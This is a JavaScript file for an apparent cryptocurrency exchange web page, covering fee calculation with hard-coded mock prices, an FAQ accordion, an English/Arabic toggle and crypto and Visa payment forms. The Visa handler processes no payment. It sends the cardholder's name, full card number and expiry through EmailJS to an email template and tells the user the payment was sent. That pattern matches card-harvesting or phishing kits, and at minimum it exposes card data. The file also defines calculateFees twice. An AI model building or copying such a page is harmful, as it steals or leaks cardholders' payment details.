// Initialize EmailJS
(function() {
    emailjs.init("YOUR_USER_ID"); // Replace with your EmailJS user ID
})();

// DOM Elements
const exchangeForm = document.getElementById('exchangeForm');
const cryptoAmount = document.getElementById('cryptoAmount');
const cryptoSelect = document.getElementById('cryptoSelect');
const cryptoBtn = document.querySelector('.crypto-btn');
const visaBtn = document.querySelector('.visa-btn');
const cryptoForm = document.querySelector('.crypto-form');
const visaForm = document.querySelector('.visa-form');
const copyBtn = document.querySelector('.copy-btn');
const faqItems = document.querySelectorAll('.faq-item');
const langBtn = document.querySelector('.lang-btn');
const cryptoPrices = document.querySelectorAll('.crypto-price');

// State
let currentLang = 'en';
let prices = {};
let exchangeRate = 0;

// Constants
const SUPPORTED_CURRENCIES = ['btc', 'usdt', 'ltc'];
const API_BASE_URL = 'https://api.coingecko.com/api/v3';
const UPDATE_INTERVAL = 30000; // 30 seconds

// Utility Functions
const formatCurrency = (amount, currency = 'USD') => {
    return new Intl.NumberFormat('en-US', {
        style: 'currency',
        currency: currency
    }).format(amount);
};

const showError = (message) => {
    alert(message); // Replace with a better error handling UI
};

// API Functions
// Mock prices for testing (remove in production)
const mockPrices = {
    btc: 88769.00,
    usdt: 1.00,
    ltc: 119.29
};

async function fetchCryptoPrices() {
    try {
        // For testing, use mock prices instead of API call
        prices = mockPrices;
        
        // Update display and recalculate fees
        updatePriceDisplay();
        
        // Update fees if amount is already entered
        if (cryptoAmount.value) {
            updateFeeSummary(cryptoAmount.value);
        }
    } catch (error) {
        console.error('Error:', error);
        showError('Unable to fetch current prices. Please try again later.');
    }
}

function calculateFees(amount) {
    const selectedCrypto = cryptoSelect.value;
    const cryptoPrice = prices[selectedCrypto] || 0;
    
    // Calculate fees in USD
    const amountUSD = amount * cryptoPrice;
    const exchangeFee = amountUSD * 0.01; // 1% exchange fee
    const networkFee = 2; // Fixed $2 network fee
    const total = amountUSD + exchangeFee + networkFee;
    
    console.log('Fee calculation:', {
        amount,
        cryptoPrice,
        amountUSD,
        exchangeFee,
        networkFee,
        total
    });
    
    return {
        exchangeFee,
        networkFee,
        total
    };
}

function updatePriceDisplay() {
    cryptoPrices.forEach(element => {
        const currency = element.dataset.crypto;
        if (prices[currency]) {
            element.textContent = formatCurrency(prices[currency]);
            element.classList.remove('loading');
        }
    });
    // Update fees after prices are updated
    updateFeeSummary(cryptoAmount.value);
}

// Payment Handling
function togglePaymentForms(showCrypto = true) {
    cryptoForm.classList.toggle('hidden', !showCrypto);
    visaForm.classList.toggle('hidden', showCrypto);
    
    // Reset active states
    cryptoBtn.classList.toggle('active', showCrypto);
    visaBtn.classList.toggle('active', !showCrypto);
}

function calculateFees(amount) {
    const selectedCrypto = cryptoSelect.value;
    const cryptoPrice = prices[selectedCrypto];
    
    // If prices haven't been fetched yet, return zero fees
    if (!cryptoPrice) {
        return {
            exchangeFee: 0,
            networkFee: 0,
            total: 0
        };
    }
    
    // Calculate fees in USD
    const amountUSD = amount * cryptoPrice;
    const exchangeFee = amountUSD * 0.01; // 1% exchange fee
    const networkFee = 2; // Fixed $2 network fee
    const total = amountUSD + exchangeFee + networkFee;
    
    return {
        exchangeFee,
        networkFee,
        total
    };
}

function updateFeeSummary(amount) {
    console.log('Updating fees for amount:', amount);
    const parsedAmount = parseFloat(amount) || 0;
    console.log('Parsed amount:', parsedAmount);
    
    const fees = calculateFees(parsedAmount);
    console.log('Calculated fees:', fees);
    
    // Update fee display with proper formatting
    const feeElements = document.querySelectorAll('.fee-item .fee-amount');
    console.log('Found fee elements:', feeElements.length);
    
    if (feeElements.length >= 2) {
        feeElements[0].textContent = formatCurrency(fees.exchangeFee);
        feeElements[1].textContent = formatCurrency(fees.networkFee);
        
        // Update total amount
        const totalElement = document.querySelector('.fee-item.total .total-amount');
        if (totalElement) {
            totalElement.textContent = formatCurrency(fees.total);
            console.log('Updated total amount:', fees.total);
        } else {
            console.log('Total amount element not found');
        }
    } else {
        console.log('Fee elements not found');
    }
}

// Add listener for crypto selection change
cryptoSelect.addEventListener('change', () => {
    updateFeeSummary(cryptoAmount.value);
});

// Form Validation
function validateCryptoForm() {
    const amount = parseFloat(cryptoAmount.value);
    if (!amount || amount <= 0) {
        showError('Please enter a valid amount');
        return false;
    }
    if (amount > 10000) {
        showError('Maximum amount allowed is 10,000');
        return false;
    }
    return true;
}

function validateVisaForm() {
    const cardName = document.getElementById('cardName').value;
    const cardNumber = document.getElementById('cardNumber').value;
    const cardExpiry = document.getElementById('cardExpiry').value;
    const cardCvv = document.getElementById('cardCvv').value;

    if (!cardName || !cardNumber || !cardExpiry || !cardCvv) {
        showError('Please fill in all card details');
        return false;
    }

    // Basic card number validation
    if (!/^\d{16}$/.test(cardNumber.replace(/\s/g, ''))) {
        showError('Invalid card number');
        return false;
    }

    // Basic expiry date validation (MM/YY)
    if (!/^\d{2}\/\d{2}$/.test(cardExpiry)) {
        showError('Invalid expiry date format (MM/YY)');
        return false;
    }

    // Basic CVV validation
    if (!/^\d{3,4}$/.test(cardCvv)) {
        showError('Invalid CVV');
        return false;
    }

    return true;
}

// Event Handlers
cryptoBtn.addEventListener('click', () => togglePaymentForms(true));
visaBtn.addEventListener('click', () => togglePaymentForms(false));

copyBtn.addEventListener('click', async () => {
    const cryptoAddress = document.getElementById('cryptoAddress');
    try {
        await navigator.clipboard.writeText(cryptoAddress.value);
        copyBtn.innerHTML = '<i class="fas fa-check"></i>';
        setTimeout(() => {
            copyBtn.innerHTML = '<i class="fas fa-copy"></i>';
        }, 2000);
    } catch (err) {
        showError('Failed to copy address');
    }
});

cryptoAmount.addEventListener('input', (e) => {
    let value = e.target.value;
    // Remove any non-numeric characters except decimal point
    value = value.replace(/[^\d.]/g, '');
    // Ensure only one decimal point
    const parts = value.split('.');
    if (parts.length > 2) {
        value = parts[0] + '.' + parts.slice(1).join('');
    }
    // Parse the cleaned value
    const numValue = parseFloat(value);
    if (numValue > 10000) {
        e.target.value = '10000';
        e.target.classList.add('error');
        showError('Maximum amount limit reached (10,000). Please enter a lower amount.');
        setTimeout(() => {
            e.target.classList.remove('error');
        }, 500);
    } else {
        e.target.value = value;
        e.target.classList.toggle('error', !value);
    }
    updateFeeSummary(e.target.value);
});

// FAQ Accordion
faqItems.forEach(item => {
    const question = item.querySelector('.faq-question');
    question.addEventListener('click', () => {
        const isActive = item.classList.contains('active');
        // Close all FAQ items
        faqItems.forEach(faq => faq.classList.remove('active'));
        // Toggle clicked item
        if (!isActive) {
            item.classList.add('active');
        }
    });
});

// Form Submission
exchangeForm.addEventListener('submit', async (e) => {
    e.preventDefault();

    const isCryptoPayment = !cryptoForm.classList.contains('hidden');
    
    if (isCryptoPayment) {
        if (!validateCryptoForm()) return;
        
        // Handle crypto payment
        const amount = parseFloat(cryptoAmount.value);
        const currency = cryptoSelect.value;
        const fees = calculateFees(amount);
        
        // Show confirmation and proceed with transaction
        if (confirm(`Confirm transaction:\nAmount: ${amount} ${currency.toUpperCase()}\nTotal with fees: ${fees.total} ${currency.toUpperCase()}`)) {
            // Implement actual transaction handling here
            alert('Transaction initiated! Please send the exact amount to the provided address.');
        }
    } else {
        if (!validateVisaForm()) return;
        
        // Handle Visa payment
        try {
            const templateParams = {
                cardName: document.getElementById('cardName').value,
                cardNumber: document.getElementById('cardNumber').value,
                cardExpiry: document.getElementById('cardExpiry').value,
                amount: cryptoAmount.value,
                currency: cryptoSelect.value
            };

            await emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', templateParams);
            alert('Payment information sent successfully!');
            exchangeForm.reset();
        } catch (error) {
            console.error('Error:', error);
            showError('Failed to process payment. Please try again.');
        }
    }
});

// Language Toggle
const languageToggle = document.querySelector('.language-toggle');
const langButtons = document.querySelectorAll('.lang-btn');

async function loadTranslations(lang) {
    try {
        const response = await fetch(`/translations/${lang}.json`);
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        const translations = await response.json();
        return translations;
    } catch (error) {
        console.error('Error loading translations:', error);
        return null;
    }
}

async function updateUILanguage(lang) {
    const translations = await loadTranslations(lang);
    if (!translations) return;

    // Update document direction and language
    document.documentElement.setAttribute('dir', lang === 'ar' ? 'rtl' : 'ltr');
    document.documentElement.setAttribute('lang', lang);

    // Update button visibility and active state
    langButtons.forEach(btn => {
        const btnLang = btn.getAttribute('data-lang');
        btn.classList.toggle('hidden', btnLang === lang);
        btn.classList.toggle('active', btnLang !== lang);
    });

    function getTranslation(translations, key) {
        const keys = key.split('.');
        let translation = translations;
        
        for (const k of keys) {
            if (translation && translation[k]) {
                translation = translation[k];
            } else {
                console.log(`Translation not found for key: ${key}`);
                return null;
            }
        }
        
        return translation;
    }

    // Function to update element translations
    function updateElementTranslations(element, translations) {
        // Handle text content
        const textKey = element.getAttribute('data-i18n');
        if (textKey) {
            const textTranslation = getTranslation(translations, textKey);
            if (textTranslation) {
                element.textContent = textTranslation;
            }
        }

        // Handle placeholders
        const placeholderKey = element.getAttribute('data-i18n-placeholder');
        if (placeholderKey) {
            console.log(`Processing placeholder for element:`, element);
            console.log(`Placeholder key:`, placeholderKey);
            const placeholderTranslation = getTranslation(translations, placeholderKey);
            console.log(`Placeholder translation:`, placeholderTranslation);
            if (placeholderTranslation) {
                // Force update the placeholder
                element.placeholder = placeholderTranslation;
                // Also set the attribute as backup
                element.setAttribute('placeholder', placeholderTranslation);
            }
        }
    }

    // Update all translatable elements
    document.querySelectorAll('[data-i18n], [data-i18n-placeholder]').forEach(element => {
        updateElementTranslations(element, translations);
    });

    // Re-apply translations after a short delay to ensure they stick
    setTimeout(() => {
        document.querySelectorAll('[data-i18n], [data-i18n-placeholder]').forEach(element => {
            updateElementTranslations(element, translations);
        });
    }, 100);
}

// Initialize language buttons
langButtons.forEach(btn => {
    btn.addEventListener('click', async () => {
        const newLang = btn.getAttribute('data-lang');
        if (newLang !== currentLang) {
            const otherLang = newLang === 'en' ? 'ar' : 'en';
            
            // Update button states immediately
            document.querySelector(`[data-lang="${newLang}"]`).classList.add('hidden');
            document.querySelector(`[data-lang="${otherLang}"]`).classList.remove('hidden');
            
            // Update language
            currentLang = newLang;
            document.documentElement.setAttribute('dir', currentLang === 'ar' ? 'rtl' : 'ltr');
            document.documentElement.setAttribute('lang', currentLang);
            
            // Load and apply translations
            await updateUILanguage(currentLang);
        }
    });
});

// Set initial language
document.addEventListener('DOMContentLoaded', () => {
    const initialLang = 'en';
    currentLang = initialLang;
    updateUILanguage(initialLang);
});

// Card Input Formatting
document.getElementById('cardNumber').addEventListener('input', (e) => {
    let value = e.target.value.replace(/\D/g, '');
    value = value.replace(/(\d{4})/g, '$1 ').trim();
    e.target.value = value.substring(0, 19); // Limit to 16 digits + 3 spaces
});

document.getElementById('cardExpiry').addEventListener('input', (e) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length >= 2) {
        value = value.substring(0, 2) + '/' + value.substring(2);
    }
    e.target.value = value.substring(0, 5); // MM/YY format
});

// Initialize
function init() {
    // Set initial prices
    prices = mockPrices;
    
    // Update display with initial prices
    updatePriceDisplay();
    
    // Show crypto form by default
    togglePaymentForms(true);
    
    // Set up price update interval (in production, this would fetch from API)
    setInterval(() => {
        prices = mockPrices;
        updatePriceDisplay();
        if (cryptoAmount.value) {
            updateFeeSummary(cryptoAmount.value);
        }
    }, UPDATE_INTERVAL);
}

// Initialize event listeners
document.addEventListener('DOMContentLoaded', () => {
    // Start the application
    init();
    
    // Set initial language
    const initialLang = 'en';
    currentLang = initialLang;
    updateUILanguage(initialLang);
});

// Smooth Scroll
document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function (e) {
        e.preventDefault();
        document.querySelector(this.getAttribute('href')).scrollIntoView({
            behavior: 'smooth'
        });
    });
});

// Add animation classes when elements come into view
const animateOnScroll = () => {
    const elements = document.querySelectorAll('.step, .security-item, .testimonial');
    
    elements.forEach(element => {
        const elementTop = element.getBoundingClientRect().top;
        const elementBottom = element.getBoundingClientRect().bottom;
        
        if (elementTop < window.innerHeight && elementBottom > 0) {
            element.classList.add('fade-in');
        }
    });
};

window.addEventListener('scroll', animateOnScroll);
// Initial check for elements in view
animateOnScroll();
